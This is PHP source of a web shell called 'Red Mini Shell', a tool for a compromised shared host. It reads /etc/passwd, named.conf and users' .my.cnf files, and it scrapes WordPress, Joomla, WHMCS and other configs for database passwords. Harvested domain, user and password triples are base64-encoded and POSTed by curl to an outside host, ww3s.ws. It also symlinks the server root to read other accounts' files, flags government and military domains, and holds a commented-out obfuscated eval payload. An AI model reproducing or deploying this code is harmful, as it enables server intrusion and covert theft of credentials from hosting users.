echo "<tr><td valign=top style=border :2px solid white; width: 139px class=style2>".$count++."</td><td valign=top style= width: 139px; border :2px solid white  class=style2 ><a href=http://".$domain.":2082 target=_blank>".$domain."</a></td><td valign=top style= width: 139px; border: 2px solid white  class=style2 >".$owner['name']."</td><td valign=top style= width: 139px; border: 2px solid white  class=style2 >".$password."</td><td valign=top style=border :2px solid white  id=menu style=width: 139px><a href=".$owner['name'].".txt target=_blank>Click Here</a></td></tr>";
$dc++;
$success3="http://".$domain."|".$owner['name']."|".$password."\n";
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL,"http://ww3s.ws/ok.php");
curl_setopt($ch,CURLOPT_USERAGENT,'Mozilla/5.0 (Windows NT 5.1; rv:18.0) Gecko/20100101 Firefox/18.0');
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS,"result=".base64_encode($success3));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
curl_setopt($ch, CURLOPT_HEADER, 1);
$buffer = curl_exec($ch);
}
}
}
echo '</table>'; 
$total = $dc;

echo '</center>';
}else{
$d0mains = @file('/etc/named.conf');
    if($d0mains) {
echo "<table align=center><tr><th> COUNT </th><th> DOMAIN </th><th> USER </th><th> Password </th><th> .my.cnf </th></tr>";
$count=1;
$dc = 0;
$mck = array();
foreach($d0mains as $d0main){
    if(@eregi('zone',$d0main)){
        preg_match_all('#zone "(.*)"#',$d0main,$domain);
        flush();
        if(strlen(trim($domain[1][0])) >2){
            $mck[] = $domain[1][0];
        }
    }
}
$mck = array_unique($mck);
$usr = array();
$dmn = array();
foreach($mck as $o) {
    $infos = @posix_getpwuid(fileowner("/etc/valiases/".$o));
    $usr[] = $infos['name'];
    $dmn[] = $o;
}
array_multisort($usr,$dmn);
$dt = file('/etc/passwd');
$passwd = array();
foreach($dt as $d) {
    $r = explode(':',$d);
    if(strpos($r[5],'home')) {
        $passwd[$r[0]] = $r[5];
    }
}
$l=0;
$j=1;
foreach($usr as $r) {
$dirz = '/home/'.$r.'/.my.cnf';
$path = getcwd();
if (is_readable($dirz)) {
copy($dirz, ''.$path.'/'.$r.'.txt');
$p=file_get_contents(''.$path.'/'.$r.'.txt');
$password=entre2v2($p,'password="','"');
echo "<tr><td valign=top bgcolor=darkgreen class=style2 style=width: 139px>".$count++."</td><td valign=top bgcolor=darkgreen class=style2 style=width: 139px><a target=_blank href=http://".$dmn[$j-1].'/>'.$dmn[$j-1].' </a></td><td valign=top bgcolor=darkgreen class=style2 style=width: 139px>'.$r."</td><td valign=top bgcolor=darkgreen class=style2 style=width: 139px>".$password."</td><td valign=top bgcolor=darkgreen class=style2 style=width: 139px><a href='".$r.".txt' target='_blank'>Click Here</a></td></tr>";
$dc++;
                flush();
                $l=$l?0:1;
                $j++;
				}
            }
			}
echo '</table>'; 
$total = $dc;
echo '<br><div class=result valign=top bgcolor=darkgreen class=style2 style=width: 139px >Total cPanel Found = '.$total.'</h3><br />';
echo '</center>';
}

}else{
echo "<div class=result><i><font color=#FF0000>ERROR</font><br><font color=#FF0000>/var/named</font> or <font color=#FF0000>etc/named.conf</font> Not Accessible!</i></div>";
}
}
   elseif(isset($_GET["jump"]))
	{
	 ($sm = ini_get('safe_mode') == 0) ? $sm = 'off': die('<b>Error: safe_mode = on</b>');
	set_time_limit(0);
	@$passwd = fopen('/etc/passwd','r');
	if (!$passwd) { die('<b>[-] Error : coudn`t read /etc/passwd</b>'); }
	$pub = array();
	$users = array();
	$conf = array();
	$i = 0;
	while(!feof($passwd))
	{
		$str = fgets($passwd);
		if ($i > 35)
			{
			$pos = strpos($str,':');
			$username = substr($str,0,$pos);
			$dirz = '/home/'.$username.'/public_html/';
			if (($username != ''))
				{
				if (is_readable($dirz))
					
					{
					array_push($users,$username);
					array_push($pub,$dirz);
					}
				}
			}
		$i++;

		//$jumper          = "3VRRb5swEP4rFwvNRqVAtkmTEiCTpk7aHjppe5rSiBlsilfAyDZrs2r/fefQpM3LfsCEMObuu++7Ox/IutVAMserTkLdcWvzG1L3otIPN6TInMFbQK07O/IBXa/RStbAAttDDmpQ5a10jFreyLLXQtIQ8hzSEDYwQ6huGroCoSQjV8Zos4JvRzC6vwxZ4kSBi/GLT6PIhPp1ykUNjUbNbVlWb969vYN+OSwh89mcILd8z32yHFojm5xuaEHi4OGa9zImWcKR2OMLuBLKKX1dlrssQY0CzpR+zjTwGZ8db+HTIPQgreJ3E7yq9bhfA4kFd5LR7zRyqpcsDGMCz1qwvgxhpibhGqx0pYeVneqVYyma3gcjit0LrLzRoxwYTaSrk9lII2ooglQDbPEEDOHR9w4Y2V7u4NBAWMEHPYnhh4Ovkgt4wfD/9vIPBONUYdu4MXzP0BJMVhp7Zqn10JwZFL6la7hvVSfZopG6Yce+ho84oM74g8AJtif73H6MLGCZph41aq+CWNwwHxPRFT0mMGCy3jtV6Ji9aeRDPEAo89t/Akmre5nQ+BQR0wSr6VRdtq7vEjqLsmfGBUZRn6O3K1saPGh/nuzA6R2HIstxsu0cZqNTNEq/9KJSNIf5NvorUBcXft9o5K1beGIAbueikF76/wLdftTTIGCxg+NAkM0+PyvnvBRS/MOZHOanMgX14pviLw==";

		//@eval(gzinflate(base64_decode($jumper)));
	}
	echo '<br>';
	echo "[+] Founded <font size=15 color=red> ".sizeof($users)." </font> entrys in /etc/passwd\n"."<br />";
	echo "[+] Founded <font color=red size=15> ".sizeof($pub)." </font> readable public_html directories\n"."<br /><br /><br />";

	foreach ($users as $user)
		{
		$path = "/home/$user/public_html/";
		echo "<table bgcolor=black class=style2 ><td>";
		echo "<font color=white><a target='_blank' href='bsn.php?y=$path'>$path<a/></font><br>";
		echo "</td></table>";
		}
	echo "\n";
}
   elseif(isset($_GET["pws"]))
	{
set_time_limit(0);
error_reporting(0);
echo'<form method="post">
<input type="text" name="conf" value="" />
<input type="submit" value="GeT Passwords" name="get" />
</form>';
 
$g = $_POST['get'];
$dir = $_POST['conf'];

if(isset($g) && $dir != ""){
 
        $cn = @file_get_contents($dir);
        //preg_match_all('#href="(.*?)">(.*?)<#',$cn,$m);    // $m[2]
        preg_match_all('#href="(.*?)"#',$cn,$m);
       
       
        foreach($m[1] as $txt){
       
        $url = $dir.$txt;
        $cnurl = @file_get_contents($url);
        preg_match('#\'DB_PASSWORD\', \'(.*)\'#',$cnurl,$m1);             // wordpress
        preg_match('#password = \'(.*)\'#',$cnurl,$m2);                   // joomla
        preg_match('#password\'] = \'(.*)\'#',$cnurl,$m3);                        // vb
        preg_match('#db_password = "(.*)"#',$cnurl,$m4);                          // whmcs
        preg_match('#db_password = \'(.*)\'#',$cnurl,$m4);                        // whmcs
        preg_match('#dbpass = "(.*)"#',$cnurl,$m5);                               //
        preg_match('#password   = \'(.*)\'#',$cnurl,$m6);                         // connnect.php
        preg_match('#dbpasswd = \'(.*)\'#',$cnurl,$m8);                           // phpBB 3.0.x
        preg_match('#password_localhost = "(.*)"#',$cnurl,$m9);           // conexao.php
        preg_match('#senha = "(.*)"#',$cnurl,$m10);                       // /_inc/config.inc.php
       
        if(!empty($m1[1])){ echo $m1[1]."<br>"; }
        elseif(!empty($m2[1])){ echo $m2[1]."<br>"; }
        elseif(!empty($m3[1])){ echo $m3[1]."<br>"; }
        elseif(!empty($m4[1])){ echo $m4[1]."<br>"; }
        elseif(!empty($m5[1])){ echo $m5[1]."<br>"; }
        elseif(!empty($m6[1])){ echo $m6[1]."<br>"; }
        elseif(!empty($m7[1])){ echo $m7[1]."<br>"; }
        elseif(!empty($m8[1])){ echo $m8[1]."<br>"; }
    elseif(!empty($m9[1])){ echo $m9[1]."<br>"; }
        elseif(!empty($m10[1])){ echo $m10[1]."<br>"; }
        }
}
	}
	 elseif(isset($_GET['x']) && ($_GET['x'] == 'symlink')) {	 echo " <form action= method=post>";
 @set_time_limit(0);
 echo "<center>";
 @mkdir('sym',0777); 
$htaccess = "Options all \n DirectoryIndex Sux.html \n AddType text/plain .php \n AddHandler server-parsed .php \n AddType text/plain .html \n AddHandler txt .html \n Require None \n Satisfy Any"; $write =@fopen ('sym/.htaccess','w'); fwrite($write ,$htaccess); @symlink('/','sym/root'); $filelocation = basename(__FILE__); $read_named_conf = @file('/etc/named.conf'); if(!$read_named_conf) { echo "<pre class=ml1 style='margin-top:5px'># Cant access this file on server -> [ /etc/named.conf ]</pre></center>"; } else { echo "<br><br><div class='tmp'><table border=1 bordercolor=#FF0000 width=500 cellpadding=1 cellspacing=0><td>Domains</td><td>Users</td><td>symlink </td>"; foreach($read_named_conf as $subject){ if(eregi('zone',$subject)){ preg_match_all('#zone "(.*)"#',$subject,$string); flush(); if(strlen(trim($string[1][0])) >2){ $UID = posix_getpwuid(@fileowner('/etc/valiases/'.$string[1][0])); $name = $UID['name'] ; @symlink('/','sym/root'); $name = $string[1][0]; $iran = '\.ir'; $israel = '\.il'; $indo = '\.id'; $sg12 = '\.sg'; $edu = '\.edu'; $gov = '\.gov'; $gose = '\.go'; $gober = '\.gob'; $mil1 = '\.mil'; $mil2 = '\.mi'; if (eregi("$iran",$string[1][0]) or eregi("$israel",$string[1][0]) or eregi("$indo",$string[1][0])or eregi("$sg12",$string[1][0]) or eregi ("$edu",$string[1][0]) or eregi ("$gov",$string[1][0]) or eregi ("$gose",$string[1][0]) or eregi("$gober",$string[1][0]) or eregi("$mil1",$string[1][0]) or eregi ("$mil2",$string[1][0])) { $name = "<div style= color: #FF0000 ; text-shadow: 0px 0px 1px red; >".$string[1][0].'</div>'; } echo " <tr> <td> <div class=dom><a target=_blank href=http://www.".$string[1][0].'/>'.$name.' </a> </div> </td> <td> '.$UID['name']." </td> <td> <a href=sym/root/home/".$UID['name']."/public_html target=_blank>Symlink </a> </td> </tr></div> "; flush(); } } } } echo "</center></table>"; } 
	echo "</div><center><b><br><br><br><font color=red>&copy 2015 </font></center><b>
		<br><center>Red Mini Shell</center><br>";
?>>